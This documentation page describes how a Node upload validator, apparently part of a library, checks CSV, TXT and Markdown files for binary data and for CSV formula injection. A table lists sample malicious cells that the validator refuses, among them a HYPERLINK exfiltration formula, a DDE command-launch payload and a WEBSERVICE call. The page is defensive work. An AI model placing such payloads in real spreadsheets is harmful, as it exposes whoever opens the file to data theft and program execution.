---
title: CSV injection in Node uploads
sidebar:
  label: CSV and text
description: How CSV and TXT uploads are checked for binary data and formula injection.
---

| Extension | MIME type |
| - | - |
| `csv` | `text/csv`, also `application/vnd.ms-excel` (what Windows sends), `application/csv`, `text/x-csv`, `text/comma-separated-values`, `text/plain` |
| `txt` | `text/plain` |
| `md` | `text/markdown`, `text/plain` |

## Binary data

Text has no magic number, so the check is the other way round: no binary data. UTF-8, UTF-16 with a byte order mark and single-byte Windows code pages pass. Control characters other than tab, line feed, form feed and carriage return, and UTF-16 without a byte order mark, are refused as `content-mismatch`.

## Formulas in CSV

A spreadsheet that opens a CSV runs cells that look like formulas. `=HYPERLINK(...)` can send data from the sheet to another server, and `=cmd|' /C calc'!A0` asks Excel to start a program through DDE.

A CSV cell is refused as `macros` when it starts like a formula (`=`, `+`, `-` or `@`, after optional spaces and quotes) and calls a function or DDE:

| Cell | Result |
| - | - |
| `=HYPERLINK("https://example.com/?"&A1,"Click")` | refused |
| `=cmd\|' /C calc'!A0` | refused |
| `@SUM(1+1)*cmd\|' /C calc'!A0` | refused |
| `  =WEBSERVICE("https://example.com/")` | refused |
| `-5` | accepted |
| `+49 (30) 1234` | accepted |
| `=1+2` | accepted |

Quoted cells across lines are read as one cell, and `,`, `;` and tab all count as separators.

## TXT and Markdown

Plain text and Markdown files are checked for binary data only. They are not opened as spreadsheets, so formulas are not looked for.

Markdown is opt-in (risk `elevated`): rendered, it becomes HTML, and raw HTML or `javascript:` links in it become part of your page. Sanitize what you render, or offer the file only as a download.
